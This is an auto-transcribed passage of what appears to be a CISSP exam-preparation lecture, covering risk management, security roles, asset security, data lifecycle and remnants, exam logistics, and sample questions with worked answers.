minimal human interaction or the second
threat would be man-made where man is
responsible for it like theft hacking
writing war anything that is created by
a man or rather humans and technical in
nature could be software bugs where
vulnerabilities create are created or
server failures where something
technical has gone wrong and you need a
technical as skilled person to come in
and repair that particular aspect then
the fourth one would be a supply system
failure or a chain supply failure where
you have dependencies for example any
organization will have a dependency on
electricity service provider where they
are providing electricity as a service
which powers on the id infrastructure if
the service broader fails and there is
electricity or a power cut your systems
are not going to work thus you need a
secondary mechanism to prevent that
threat from being realized once we have
identified these threats we have
identified these vulnerabilities and we
have identified the likelihood and the
probability of that attack that's where
we come across the risk management
exercise now what is risk management
risk management is a hypothetical
exercise where we have identified a
vulnerability we have looked at the
threat that it may have and the
likelihood of that for our threat being
realized once we have identified the
threat uh the risk level that's where
the risk management comes into the
picture reading from the slides a core
component of enterprise security program
why because we need a baseline and we
compare security to a baseline for
example i've got a firewall that has
been configured in a particular manner
now when i do a vulnerability assessment
on the firewall it the vulnerability
assessment gives me a report that states
that some of the rules may now be
redundant thus allowing access to
unauthorized users this becomes a risk
or this becomes a threat if this threat
is identified by unauthorized people
they would then try to attack this
firewall to gain access to that data
which they are unauthorized to access
thus
leading to losses for an organization
what is the likelihood of this happening
if the likelihood is high
or low that's what the risk management
program is all about right and based on
this risk we implement security controls
we manage the security controls and then
we verify the security controls for
future risks to coming into the picture
it must be defined and it is always
defined as an ongoing project because
risks will always change based on the
businesses based on the security
controls that you have this will give a
guidance to an organization of how
securities being implemented how it has
enhanced over a period of time and how
security mature that organization has
become because of the risk assessment
program it also helps you to satisfy two
aspects due diligence and due care what
is due diligence due diligence is
basically the research that organization
does in identifying those risks and
mitigating them the due care is the
actual part of mitigation where you have
implemented a security control to
mitigate the risk that you have
identified so if companies negligent
that means if the company doesn't have a
risk management program it is not going
to be that security uh oriented or the
security is not going to be that great
does the company may not comply to laws
regulations and standards thus causing
them penalties lawsuits and other
reputations in the industry based on
whatever they are doing for risk
management we come to frameworks the
frameworks are used to categorize
information systems so that we can
identify threats or risks based on the
classification so this classification
helps us determine the criticality and
the sensitivity of information system
right so what is the sensitivity and
criticality it basically gives us an
understanding of the value of the asset
that we have so if you go back to domain
one the asset value or the asset
identification asset security that's
where it comes into the picture
obviously a database server is going to
be more secure than an end user laptop
based on the data that they have thus
the criticality of the system for a
database is much higher than the end
user's laptop then we look at the
security controls that can be
implemented then for those the
frameworks like iso 27001 comes into the
picture there is kobe there is there are
a lot of frameworks out there nist 800
iphone 53 then we talk about assessing
the security controls once we have
placed those security controls we need
to verify those controls are placed
properly they actually mitigate the risk
and are appropriate to correctly
mitigate that particular risk that they
are created then looking at authorizing
information systems grant information
systems operations based on risks
determined so you have identified risks
you have authorizing some of them some
of the devices to function in a
particular manner based on which some of
those risks would be mitigated or would
be reduced to an acceptable level so in
the cissp we talk about a lot of risk
assessment strategies we look at how we
can manage risks the four different
types of managing risks would be one is
to mitigate other is to transfer the
third is to accept it and the fourth one
is to neglect the risk so uh in the
cissp it talks in great details about
those risk assessment strategies we are
talking about the four types of risk
mitigating strategies they are risk
avoiding or avoiding the risks accepting
the risk transferring the risk and
eliminating the risk so uh in the course
we basically talk about a lot of risk
strategies and how to mitigate these
risks and
how they can be implemented to bring
down to a acceptable level so again risk
acceptance risk appetite of an
organization comes into the picture
these terms are then discussed
in the training to understand how the
policies would work around the risk
management strategy
moving on then looking at monitoring
security control so once we have
security controls in place we have
assist them we also need to monitor them
for the effectiveness and though they
are going to create any alerts or any
risks are being realized or any new risk
that may be created by the security
control implementation so in these risk
assessment these are the frameworks
these are the steps that we want to
follow to identify mitigate and monitor
these risks so the management begins
with risk assessment what do you mean by
risk assessment identifying the impact
of the risk that the risk would have on
the organization and there would be two
different ways to assess the risk a
quantitative assessment or a qualitative
assessment a quantitative assessment is
more quantifiable or is numerical in in
its process where you're looking at
assigning costs to particular assets and
the threats so the losses that you may
figure out in a risk assessment strategy
would be more numerical where would be
in a currency format where let's say a
risk if realized would lead to a loss of
a extra amount of dollars that's where
the quantitative analysis comes into the
picture the qualitative analysis would
be quality of a service so if a service
is being affected because of a risk what
is the degradation of that service to
what aspect is is it getting degraded
for example internet that we use if
there is an internet outage or if there
is a reduction in internet speed right
so if i've got a 10 mbps line and now
because of some fault of the isp it gets
reduced to 4 mbps i may not be able to
conduct the business that i would i was
doing on a 10 mbps line thus the quality
of that device has degraded uh does it
is going does it is a risk and it is
causing me losses right so qualitative
risk analysis would be more descriptive
in nature rather than be numerical in
nature
most of the companies or organizations
would follow a hybrid policy because it
is not possible to have a quantitative
quantitative risk analysis in each and
every scenario new organization which
doesn't have much data to rely on
historical data of how threats have
affected that particular organization
may go in for a qualitative one and as
they mature over time in the security
practices they may then turn over to a
quantitative risk analysis or a hybrid
risk analysis where they're using a
combination of quantitative and
qualitative both thus uh the risk
controls that we were talking about risk
acceptance risk reduction and risk
assignment uh there is risk avoidance as
well so there are four controls the risk
reduction is where you have implemented
a security control
based on which the risk has been reduced
to a more acceptable level risk
assignment is where you're also known as
risk avoidance that's where you're
avoiding risk by outsourcing it so
talking about risk controls again the
four types being accept avoid transfer
and reduce risk acceptance is where uh
your the organization is willingly
accepting the risk as the way it is
because they don't want to deal with it
right now they might deal it with it in
the next iteration or it doesn't it is
at an acceptable level and the company
just wants to move on avoiding the risk
is where you are going to try to not use
the service where the risk exists thus
avoiding is where you have identified a
particular service where the risk exists
and now you're not using the service to
avoid the risk altogether risk
limitation or risk reduction would be
where you are implementing a security
control to mitigate the risk and then
risk transference is where risk
assignment comes into the picture where
you are transferring it to a third party
like outsourcing it by using insurance
to limit the risk so for example the
threat is of a fire the risk is high but
you cannot do anything about it so you
purchase insurance so if the fire
actually happens you would still be
reimbursed for the losses that you have
faced coming back to counter measures we
have discussed administrative
countermeasures these are policies rules
regulations laws customs that a company
needs to adhere to based on the industry
that they are in then there are
technical controls software controls
anything that is technical in nature ids
ips firewalls encryption anything that
is going to help you implement the cia
and then physical where you would look
at
locks on doors security guards at
offenses
where they're preventing access to
unauthorized people let's talk about
rules and responsibilities of management
now as far as management is concerned or
uh the hierarchy is concerned uh you can
see on the screen there's a senior
management the security professional
data owner custodian and user now these
are from exam perspective from the
certification perspective obviously the
hierarchy in an organization would be
slightly different but here the senior
management is the responsible party for
the entire security mechanism so they
must drive the entire security pro exam
so cissp talks about a top-down approach
where the senior management has realized
the importance of security and is
implementing at all levels within the
organization thus they are a part of it
and they are supporting the security
program they define the tolerance of
risk of how much risk is stopping to be
tolerated by an organization from a
monetary perspective or the qualitative
perspective as well depending on the
laws legislations regulations
compliances and the contracts the
business has signed they will rely on
security professionals to manage the
risk but the exercise and the management
process has to be defined by the senior
management once the security team comes
up with counter measures the senior
management either approves or
disapproves them
based on the return on investment of
that counter measure the security
professional assist with the development
of policy documents gives their input
because they are the people who are in
the day-to-day process of dealing with
these thus they can identify gaps and
give
good inputs to modify or to create the
policy in a more robust manner the
security professionals may be a part of
the risk assessment and risk management
team as well especially the security
technical aspects of it assist with the
implementation and maintenance of
countermeasures so the administrative
technical or physical measures that you
have identified you may be requested to
implement that for example the locks
that we have on the door the swipe locks
they are connected to a database where
the database is maintained so as a
security professional you wouldn't be
responsible to fit those locks but to
create the database manage and maintain
the database where that information is
kept upon where people are authorized
and authenticated and would be
responsible for monitoring auditing and
security assessments as well the data
owner the owner of that particular data
part would normally be the head of the
department for example the sales data is
normally owned by the director of sales
of that department so that they would be
ultimately responsible for identifying
that data classifying that data and
accepting the security controls that are
implemented they may request for
additional security controls if they
deem fit the security professional
implements the security controls then
the custodian a person who is
responsible for implementing the
approved security controls or managing
the day-to-day activity of the security
controls for example the security
professional has identified an access
control to be implemented on a data set
that the data owner owns the data owner
has approved of it it is the custodian
who is going to implement that strategy
or implement the control uh on it the
user is basically the user who or the
person who accesses the information and
id resources does whatever access
controls have been implemented would
identify the user authenticate authorize
them and help them accountable for
whatever they are doing if the user is
unable to authenticate access would be
denied in this video we will focus on
the second domain of cssp which is asset
security so let's understand the need
for asset security through a small
scenario well it was yet another regular
day in tim's organization everything was
going on fine until the organization
faced a cyber attack the hacker hacked
all the servers in tim's organization
the organization had loads of data not
all of the data had the same level of
protection the level of protection
varied from one piece of information to
another in this scenario the hacker
could hack into only that particular
data which was less protected however
this cyber attack had a huge impact on
the organization in addition to this it
was also discovered that there was some
flaw in the information classification
process that exposed even sensitive data
to a cyber attack in other words even
crucial data was left with very less
protection this gave rise to asset
security asset security is defined as
the process of collecting and protecting
assets such as data and devices asset
security helps an organization
understand and classify data with
respect to its importance which in turn
makes sure that highly valuable data
receives the most protection
asset security achieves its goals
through its domains the domains are
information classification then we have
data classification data life cycle data
remnants and finally we have data loss
prevention each of these domains have
different goals all of these domains
together make up asset security now
let's have a look at each of these
domains individually first up we have
information classification as you saw
what happened in tim's organization it
has understood that importance of data
varies largely we have to classify data
before we can move on to protecting it
we need to be able to identify which is
the most crucial data with respect to
organizations information classification
is defined as the process of segregating
data based on its importance to provide
adequate level of protection to every
piece of data information classification
is different for each sector based on
their objectives the classification
varies in the general sector information
classification is used to minimize risks
on crucial information whereas in the
government or military sector it is used
to prevent unauthorized taxes and
finally in the commercial sector it is
used to keep sensitive information
private here it is seen to it that
information is not disclosed to a
company's competitors let's now move on
to our second domain that is data
classification as the name suggests here
data is basically classified based on a
set of considerations here we will look
into factors like data retention
requirements then data security
requirements data disposal methods data
encryption requirements and finally
compliance requirements so these are the
factors which are taken into
consideration while classifying data
this entire process of data
classification is taken care of by the
data owner in addition to the
classification they also analyze the use
and value of the available data to the
company finally the data owner also
annually reviews the data classification
before classifying data an important
step is to understand the data life
cycle all of us speak of data all the
time however do we know the various
steps a piece of data goes through well
for that let us have a look at the third
domain data lifecycle we will start off
from the data creation step and
understand what happens to the data
after that as you see on your screens we
have six steps in the data lifecycle
stage they are create
store use share archive and destroy
starting off with the create phase this
is the first step in data lifecycle here
new data is generated or the existing
data is updated after the data is
created we use data repositories to
store the created data without storing
data we cannot derive any information
from it hence this step is very crucial
in the third phase data is viewed or
used in some application or processed in
addition to data being viewed and
processed it is also shared between
various users and customers our fifth
face is archive here data which is not
used frequently that is inactive data is
identified and then moved into long-term
storage systems and finally we have the
destroy phase as the name suggests data
is simply destroyed here data can be
destroyed either digitally or physically
not to forget you cannot simply destroy
data it should be done based on
regulations but have you wondered what
happens if data is not destroyed even
after we try our best to erase it well
this gives rise to data remnants in
simple words data remnants is a term
used for the residual of digital data
which remains even after attempting to
erase that particular data data remnants
should be avoided as it is not good to
have remains of a piece of data which
was intended to be destroyed security
professionals should be well versed with
techniques to avoid data remnants so how
do we tackle data remnants for this we
have various methods they are purging
clearing overwriting degaussing storing
and finally destruction let's have a
look at each of these methods
individually and understand how they
help in tackling data remnants
first up we have purging purging is done
to minimize risks on crucial information
in clearing data from storage devices
are removed however it can be
reconstructed by using various softwares
third we have overwriting here we write
over the original data several times so
that the original data cannot be
recovered degaussing is the method used
to destroy data on magnetic storage
tapes next up we have storing before
storing data on media the data is
encrypted for the purpose of safety
finally the sixth method is destruction
here storage device which hold the data
are physically damaged incineration
crushing and shredding a few of the
methods used for destruction now let's
move on to our fifth domain data loss
prevention in this domain various
security measures are adopted that will
help in making data available to only
the authorized users here we will look
into four of such measures the first
measure is data inventory in this step
data is identified and then classified
in the second step the data flow is
plotted over the life cycle the third
measure is data protection strategy here
a number of risk assessments are
performed the fourth measure is
implementation in this step we take up
cases which have had a history of data
loss for testing purpose those were the
five domains under asset security in
addition to these it is also required
that we understand the term privacy with
respect to asset security privacy is a
very crucial aspect when it comes to
western security
information privacy and data privacy are
more or less the same this term is used
to differentiate one person from another
it relates to the personal data stored
on computers so what kind of data falls
under this category
well we have data such as medical
records office data financial data etc
which fall under this category to uphold
privacy we use technologies like
pseudonymization tokenization and
anonymization
well pseudonymization refers to a data
management process anonymization refers
to a process of either encrypting or
removing personally identifiable data so
that people who the data describes
remain anonymous and finally in
tokenization a sensitive piece of data
is substituted with a non-sensitive
equivalent in this video we are going to
discuss the cissp exam and its questions
what is cissp
cissp stands for the certified
information security or rather certified
information system security professional
it is considered as a gold standard in
the field of information security it is
a management certification so when you
are in the senior management this is the
kind of certifications that you would
require for your
management skills now this is a
non-technical or a semi-technical
certification here it's nothing about
vulnerability assessment or penetration
testing you're not going to do anything
hands-on you are not expected to know
hacking or you're not expected to know
how to configure firewalls anti-viruses
and whatnot it's basically something
that over a period of years of
experience you have evolved a certain
understanding of how security policies
should be constructed how they should be
implemented and how security affects an
organization so here you are responsible
to create a overall security policy for
an organization to help maintain the
security posture of an organization now
as far as the certification is concerned
it has a validity of three years after
which you don't have to give the exam
again however during these three years
you have to earn a certain point so it
is known as a continuing power education
points that isc square allows you to
generate points by attending lectures or
by attending webinars by publishing
white papers by providing trainings
obviously all of these should be
authorized and you should have a
validation from a authorized party that
you have done this activity once it is
verified you will be awarded certain
points once you have collected
sufficient number of points you will
retain your certification beyond three
years the passing rate of this exam is
less than 50 so it's not how much you
require to score what this basically
tells you is the amount of people who
actually clear the exam in the first
attempt now let's not get disheartened
because of this essentially the exam is
quite tough it's known as a mild white
an inch deep exam that means you need to
know just about everything and anything
that is there to be known in information
security and that's something that we
are going to discuss when we go into the
eight domains of cissp what happens is
there are a lot of people who are not
actually prepared for the exam who think
they are prepared attempt the exam and
sadly fail in their first attempts some
people just misjudge the exam and not
prepared for it so the fact that i'm
trying to put across is be very well
prepared i have seen people who study
for months together attempt a lot of
questions ensure that their knowledge is
up to the mark and only then do they
attempt the exam anybody can register
for the exam to be honest and clear the
exam as well however to get certified
there are two different avenues so if
you have a experience of at least five
years in two of the domains that are in
the cissp course you get certified so
even if you clear the exam there is a
validation process that happens after
the exam where you have to submit
documentation to prove to isc square
that you have that level of experience
and once it is pro proven and validated
you get certified as a cissp if you do
not have that five years of experience
you get certified as an associate of iic
square for cissp and they give you six
years during which you can achieve the
level of experience prove it to them and
then get certified as a cissp so you can
see the stringent levels that are taken
for this certification the validation is
basically documentation and proof that
you have to submit and which is verified
so even after you clear an exam to get
validated and get certified it can take
up to five to six weeks for isc square
to validate and provide you with the
certification with that let's go and see
the exam let's have an overview of what
the exam is all about the governing
bodies isc square that's what we have
been referring to and the professional
experience at least four years of
college degree or additional credentials
from isc squares approved list that will
satisfy one year of required experience
and five years of paid full-time work
experience in two or more domains like i
said anybody can give the exam register
for it attempt it once you clear then
that's where the criteria of your work
experience comes into the picture you
prove five years of experience probably
by a letter from your organization from
your hr saying you have this kind of
experience that is relevant to the
certification they will isis square will
validate it you get the certification if
you don't have that experience you get
associate of ic square and then you get
six years to attain that level of
experience after which you can get
certified the exam fees what 699 dollars
so it's an expensive exam a single
attempt for each voucher so if you fail
that's another 700 for the second
attempt the fact being if you fail for
the first time you cannot attempt the
exam for the next 30 days if you fail
for the second time you cannot attempt
the exam again for the next 60 days and
if you fail for the third time you
cannot attempt the exam for another 90
days so there's a cooling off period
after each attempt so i would suggest
study hard go for the first attempt
clear it and nail it the maintenance
fees for your certification is again 85
us dollars for three years the exam
length is three hours and the questions
could vary from 100 to 150 150 being the
max questions that can be asked in that
exam you can clear the exam well before
150 questions so be prepared for that as
well but imagine when you're walking
into that exam bear in mind that you
will be asked 150 questions and you have
to time those in three hours 180 minutes
that's what three hours is so if you do
the math not much time for every
question so it's just a minute and a
half or less than that for each question
and the questions could be very
descriptive could be confusing so you
have to have your mental faculties
really strong during the exam the
passing score is 700 out of a possible
1000 points exam language is english
testing centers there are isc square
authorized centers where you need to
book that exam there's a huge process
that you have to follow to wherever you
go for the exam itself so once you have
registered on the isc square portal and
you purchase the voucher they will give
you a list of centers in your vicinity
that you can look into they'll give you
a calendar to give you the possible
dates that you can attempt the exam on
select the center select the date reach
the center at least half an hour before
the scheduled time there is a
verification so you have to carry your
identification a government issued
document either a passport driver's
license where you have to prove that you
are who you say you are and once the
verification is done only then do you
get to attempt the exam the question
formats are three types multiple choice
drag and drop and hotspots multiple
choice is the format that we are going
to look at when we look at sample
questions it's the same they give you a
question they give you four options
either one or more options need to be
chosen they will specify if there is
more than one answer to that particular
question in a drag and drop it's most
like more like match the following so
there will be a column a and column b
and uh they'll ask you a question and
say okay column a gives you the options
drag and drop whichever correct answer
is in c is from column a to column b and
then submit the answer if the answer is
correct you get awarded the points else
there is no negative marking the third
is a hotspot a hotspot question is
basically a diagram let's say a
architectural diagram that will be
presented to you and they will ask you
to pinpoint a certain aspect within that
diagram for example they may give you an
architectural overview of a network of
how it has been established and they
will ask you for a network-based
firewall which is the most
likeliest area that you want the
firewall to be placed in so you don't
need to know how to configure the
firewall but from an architectural
perspective you need to know where that
firewall needs to be placed for it to be
the most effective for the given
scenario in the question these are the
domains that are asked so you can see it
basically covers anything and everything
that is there in information security it
starts off with security and risk
management which weighs 15
in your questions in your exam so if
your exam is 115 questions 15
would be around we'll have around 20 22
odd questions and risk management being
one of the most important topics for
these kind of certifications then uh
asset security which covers 20 10
of your questions so that's around 15
questions security architecture and
engineering this is where your
infrastructural knowledge uh your
security architecture your enterprise
architecture all those come into the
picture there are a lot of theoretical
models that you need to study in domain
3 and that covers 13 of your exam
communications and network security this
is the most technical topic within all
these eight topics this is where you
talk about networks you talk about tcp
you discuss protocols like tcp udp you
discuss different attacks
man-in-the-middle attacks toss attacks
and this basically has 14 percent of
weightage then you have identity and
access management which basically talks
about users subjects objects subject
being the user object being the resource
and a relationship between these to be
created where people are authorized for
some activity authenticated and only
then allowed and also held accountable
for whatever activity they have done
then you go into security assessment and
testing so vulnerability assessments
penetration test software test testing
sas tasked a little bit all those will
be covered in domain number six which
has 12 percent weightage then security
operations so security operation center
or the stock day-to-day management of
incidents so your incident management
would come into the picture problem
management change management all of
those things would come under domain 7
as security operations which has 13 of
weightage and then finally software
development security now you don't need
to know development or you don't need to
know any programming there are no
program based questions they're not
going to ask you how to code they're
going to ask you how to manage a
software development life cycle or a
secure software development lifecycle so
this is where your waterfall models
modified waterfall models spiral agile
devops devsecops all come into the
picture and this has 10 percent of
weightage now it is near about
impossible for everyone or anyone to get
experience across all these domains so
you will have your strong points and you
will have your weak points the task is
to identify where you're good at
understand those things make the maximum
amount of it then identify your weak
points and start developing on those if
you are able to look at it from a
theoretical perspective however if you
can get an internship or if you can get
a you can say just an insight of how it
works in the practical world it would be
very helpful now that being said as far
as
is concerned it involves a very ideal
world the real world actually doesn't
come into the question because the real
world will have a lot of business logic
to it by business logic what do we mean
every organization will modify their
projects based on the expertise that
they have based on the talent that they
have and based on the people
or the hierarchy of the organization
that has been established so it can be
customized to each and every
organization since an exam cannot deal
with these kind of customizations we
deal with an ideal world so for the
cissp exam we assume that we have all
the resources we have all the people
that are required we have an hierarchy
in the training which is given out where
we have rules for each and every person
and job titles for each and every person
right so when we go through the training
it is very essential that we understand
what these job roles are what their
responsibilities are so that when we get
those questions we can identify which
person is going to attempt what in the
real world things are very different we
piggyback we take on multiple
responsibilities and that is something
that cissp doesn't adhere to so you have
to be very careful identify the job
roles identify the responsibilities have
that map the hierarchical map created
very well and then try to implement the
ideal world scenario from the cissp
standards to see what is going to happen
that being said let's move on let's
discuss the domains now these domains
we've already seen what we can do is we
are going to move on to the sample
questions for each and every domain once
we reach the domain we'll see what the
topics in that domain are we'll look at
the sample questions then we will look
and go to the next domain see the topics
in that domain and then look at the
sample questions as well so what to
study and those sample questions
revolving them so looking at the first
module or first domain security and risk
management now this is one of the
largest domains that could be
debatable for me i would say the largest
domain could be domain number three
security architecture and engineering uh
could also be domain number four because
it is quite technical communications and
network security and could also be
security operations because that's
incident management change management
problem management altogether but each
domain is very important from the exam's
perspective if you're thinking about
keeping a domain for options forget it
that's not the right way to address the
exam let's start off with the first one
security and risk management this domain
teaches you all about information
systems management and this talks about
risks and everything so what we are
going to do is we are just going to go
to the official document from iic square
where these domains and their topics are
given so that's the exam outline from
cis from ic square towards cissp this is
the latest document that is there
available online you can see the url in
my browser address bar and these are the
eight domains there's the exam three
hours number of questions 100 to 150
multiple choice and advanced innovative
questions that's where the drag and drop
and the hotspot comes into the picture
though based on experience i can tell
you that 90
of your questions would be multiple
choice 10 would either be drag and drop
and hotspots passing grade is 700 out of
1000 points exam language availability
is english those who want to attempt in
other languages it is available but then
the exam is six hours and the questions
are 250. so that's your option depending
on which language you're most
comfortable with we are going to go with
english that's the language options
coming in cisp union exam 6 hours 250
questions everything else remains the
same these are the languages supported
french german brazilian portuguese
spanish japanese simplified chinese and
korean the weightage i guess remains the
same and that's the first domain
security and risk management so what
does it pertain to understand and apply
concepts of cia confidentiality
integrity and availability in the first
video we have gone through all the eight
domains at quite some length we have
discussed what cia is all about and how
the interrelationship is so if you want
a deep dive or rather a deeper dive than
what we are doing for the domains go
back to the first video uh look into
that and then you can come back to this
video again so evaluate and apply
security governance principles so we
have to understand what governance is
now governance is basically having a
overlying architectural security policy
that can be integrated with an
enterprise architecture and thus having
your security policy in alignment with
the business goals and objectives
security should never become a hindrance
for a business security should always
become a supporting feature which should
allow the business to be executed in a
secure manner so as a security expert
our first goal is to identify what the
business does what the business
processes are what is the business
trying to achieve and then we try to
create a security policy revolving these
to enhance the business functionality uh
in a overall picture so you're looking
at organizational processes uh
acquisitions divestitures acquisition is
when let's say scenarios where you're
trying to create a security governance
policy now the business is trying to
change because they're trying to acquire
another organization and merge it within
this organization and now your security
policy should encompass not only your
organization but but the newly acquired
organization
let's say the next five years a business
decides that the newly acquired
organization is no longer profitable and
they want to sell it off and now that's
where the diversity comes into the
picture you are now trying to separate
the entity that you have just integrated
in your security policy and you are now
trying to separate it with
confidentiality integrity and
availability of the company's data
intact without affecting the
organization at any point in time
understand the fact that security is not
only about hacking or getting hacked
it's about being secure at all points in
time during business uh continuity and
business let's say business as usual
kind of activities so that's where your
security control frameworks would come
in you're going to talk about iso 27001
we are going to talk about cobit uh pci
dss nist 800 series and so on so forth
and the most two important statements or
terms in the cissp is do care and due
diligence do you care is you doing your
own research to identify what security
controls need to be implemented or what
kind of governance needs to be
implemented and due diligence is you
yourself spending that much time money
effort into implementing those decisions
that you have come come across during
the due care thus enhancing the security
functions of an organization so when we
talk about business requirements for a
business to be effective at the same
time it needs to be legal it needs to be
compliant to regulations and laws and to
the contracts that have been created by
the organization so as far as the
concept goes when we say that security
needs to be in alignment with the
business requirements the business
requirements imply that the business is
legal is compliant to regulations is
compliant to their contractual
obligations and is following standards
that have been prescribed to them so all
of them come together and that's where
your security mapping comes into the
picture we are looking at legal and
regulatory issues like cyber crimes and
data breaches licensing and intellectual
property requirements and so on so forth
and it will also include isa square's
code of professional ethics now this is
a document apart from the eight domains
that we have talked about does what does
this document talk about this is the
prescription from iic square of
professional ethics for a cyber security
professional expect around four to five
questions from professional ethics as
well so not only is this a document that
you need to read and adhere to you will
be questioned upon this in your exam and
these are easy points to score
professional ethics something that is
ethical something that is not against
the law so it's kind of quite easy but
the questions can be confusing so you
need to go through the entire document
really well and then your organization
will have its own code of ethics however
if you look at the hierarchy ic squares
ethics comes first so your
organizational ethics should not be
contradictory to ic squares ethics in
the first place then develop document
and implement security policies
standards procedures and guidelines
identify analyze and prioritize business
continuity requirements so here that's
where your risk assessment comes into
the picture if you're looking at a
particular risk that means a particular
vulnerability has been identified you
want to
see the likelihood of that vulnerability
being exploited and then the business
impact analysis that it may have based
on which you would then create a plan to
mitigate that particular risk by having
a business continuity or a disaster
recovery plan coming into the picture
now this is as far as this domain is
concerned you're calculating the risk it
doesn't actually tell you how to
mitigate that risk that's when you go
into the next future domains and discuss
those technicalities so you can see uh
contribute and enforce personnel
security policies now the thing about
cissp is physical security also comes
into the picture why because if uh
hardware is not well protected there
would be physical attacks social
engineering attacks that could be
created which would lead to data leakage
as well and the first and the foremost
most valuable asset of an organization
is always human personnel so cissp would
also deal with people protection in the
first place for example protecting
people against social engineering
attacks making them aware about these
attacks if there are natural calamities
you have to plan a plan for them during
your disaster recovery and business
continuity plan and ensure that people
are safeguarded not only that you have
to tie these things up with identity and
access management for example account
creation account management onboarding
of employees off-boarding termination of
employees
third-party contractors consultants that
you're going to hire which are not
employees but third parties coming in to
your organization providing intelligence
and so on so forth so all of those come
into the picture as well and then that's
where your risk of management concepts
come in it gives you a very good
overview of how to identify those risks
and so on so forth now this is what the
in the first domain is all about it
itself is very huge and as we go ahead
we can tie this domain to the rest of
the domains for more deeper analysis go
to the first video and then we can come
back to this so let's start with the
questions the first question now these
are very short one-liner questions your
exams would be more descriptive to be
very honest with you if you go online no
matter what practice questions that you
try or whatever dumps if you can find
those you will find none of them will be
ever any close to the actual exam
questions you will find a lot of sites
online that sell you cissp dumps with
100 guarantee for you to clear don't
fall for that it's just a money making
scam those questions will be similar
questions something that will give you
an insight about what the exam is going
to be but when you attempt the exam you
will find out that those questions are
very different from the actual exam
itself coming back to the questions the
primary goal of security awareness
program is now what is the security
awareness program and why is it created
the primary goal so is it to provide a
platform for disclosing exposure and
risk analysis to make everyone aware of
potential risk and exposure to provide
accurate risk and exposure results a way
of communicating security procedures now
the answer to this is to make everyone
aware of potential risk and exposure
doesn't mean that you are trying to make
everybody a ethical hacker what you are
trying to do is in your organization you
are trying to create a security
awareness program which allows your
employees to know what kind of policies
exist in your company what rules need to
be followed what are the procedures that
need to be followed for them to
safeguard themselves and company assets
as well and ensure that data leakage and
data loss are kept at a minimum so
you're basically trying to make everyone
aware of the risks that they may have
for example social engineering uh not
clicking on links not uh going to
unwanted sites and so on so forth
question two a contingency plan should
address which of the following potential
risks residual risks are identified risk
now what is a potential risk a potential
risk is something that you may foresee
in the future something that may exist a
residual risk will come to that what is
an identified risk a risk that has been
identified is known to the organization
and the organization is aware of it so
potential is something that may come
into the future identified as something
that exists right now a residual risk on
the other hand is a risk that was
identified earlier on mitigated but
after mitigation there is still a amount
of residual risk that exists so these
terminologies need to be understood
really well for uh let me give you an
example of a residual risk so let's say
there's a sequel and injection flaw that
has been identified in an application
and that's a now that's now an
identified risk now you've got two
options in front of you go through a
software development lifecycle again
record that part of the application to
mitigate the risk or else have a
security control like a firewall a web
application firewall watching that risk
now the ideal scenario would be that you
go through the development process again
but that is going to take time so you
put in a compensatory control uh that is
a web application firewall in the
meanwhile to mitigate that risk and then
have the recoding done and then later on
resolve the risk all together so when we
put in the firewall to mitigate the risk
temporarily is the risk actually
addressed no there is still a
possibility of a sequel injection attack
happening but we just have it mitigated
to a certain extent because there is a
firewall watching it so that means that
there is still a residual risk a risk
that is remaining even after me
integrate
implementing the security protocol or
the security control that is what a
residual risk is something that remains
even after i put in a security control
which can be taken care of later on or
can be accepted and just moved upon so
coming back to the question a
contingency plan should address which of
the following either a potential risk a
residual risk an identified risk or all
of the above and the current answer to
that is a residual risk what is a
contingency plan a contingency plan is i
still have a security control but
something may go wrong and for that i
want a secondary control to be in place
to ensure if that if the first control
fails the second control would still be
able to identify that and stop the
security incident happening so we are
looking at residual risks and then
having contingency plan to manage those
residual risks question three when the
cost of the counter measures outweigh
the cost of the risk the best way to
handle the risk is to reject the risk
transfer the risk accept the risk or
reduce the risk now there are four ways
a risk can be managed right accept the
risk avoid the risk transfer the risk or
mitigate the risk right rejecting the
risk is not an option but what is the
question cost of a counter measure
outweighs the cost of the risk so what
is the cost of a risk the cost of a risk
is basically the impact that the
organization is going to face in a
monetary manner if the risk is realized
to mitigate that we have a counter
measure in place so if in the previous
example i have identified a sequel
injection attack and the countermeasure
to that is me implementing a security
control a web application firewall to
mitigate that risk however if somebody
executes that risk somebody does a
sequel injection attack the loss that
i'm facing is only a hundred dollars per
incident and the maximum incidence that
can happen in a year are 10 so 10 into
100 is 1 000
per annum is what that risk is going to
cost me for me to implement a web
application firewall on an annual level
it is going to cost me let's say fifteen
thousand dollars in licenses management
salaries and all of those things which
means that i'm facing a loss of one
thousand dollars but i'm spending
fifteen thousand dollars to prevent that
loss i rather have the thousand dollar
loss than spend fifteen thousand dollars
right so in this scenario the cost of
the counter major is outweighing the
cost of the risk by fourteen thousand
dollars so in this scenario which is the
best way i would do it either reject the
risk which is never an option because
you cannot reject the risk transfer risk
what is transferring your risk
transferring it to a third party by
purchasing insurance example right so if
i purchase insurance saying if this uh
if this gets compromised it's the
insurance company is going to make the
payments and safeguard it or accept the
risk or reduce the risk so in this
scenario accepting the risk is basically
accepting the risk the way it is moving
on because there is nothing that you can
do about the risk and you are willing to
accept the risk rather than spend money
on it and reduce the risk is mitigating
the risk by implementing the firewall
and spending that money and then
incurring those losses so the best
answer out of this is accepting the risk
why can't i transfer the risk because
there is no such insurance where i can
in the given example where i can get
that kind of an insurance policy
reducing the risk would entail me
spending that fifteen thousand dollars
to mitigate the thousand dollar risk
does incurring a fourteen thousand
dollar loss which is against the
business logic a business needs to make
money not spend money and that's the
fourth option that's left that's
accepting the risk which means we are
not going to implement the firewall
because it is outweighing the cost of
the risk we are just willing to accept
the risk itself and move on that's the
first domain moving on to the second
which is asset security consists of
topics about physical requirements of
information security let's go back to
the document in hand so moving on to
domain two asset security we talk about
assets assets could be now okay let's
get into the definition of what an asset
is asset could be anything that has a
monetary value associated with it from
the organization's perspective it could
be data it could be virtual assets it
could be physical assets it could be
anything and everything it could be a
license right you purchase an operating
system the operating system comes with a
virtual license that installs on your
machine or or is associated with an
email address even that license as a
value does even that license will become
a set so the basic definition is
anything and everything that is owned by
the organization and has a monetary
value associated with it right thus
you're going to we talk about asset
classification as well asset
classification could be data within data
itself there would be sub
classifications like confidential data
non confidential data public data and so
on so forth physical assets virtual
assets networking assets anything and
everything that you can come across
would be classified here determine and
maintain information and asset ownership
so your asset management program comes
into the picture and when you say asset
ownership the organization owns the
assets as they are however roles and
responsibilities that you have created
in the organization will ensure that
some assets are virtually owned by
somebody that means that they are
responsible for the well-being of that
asset so you have to identify who for
example hr now hr is a function human
resources but they also need it assets
for example a payroll which will
institute a payroll software a database
right a web application server if you
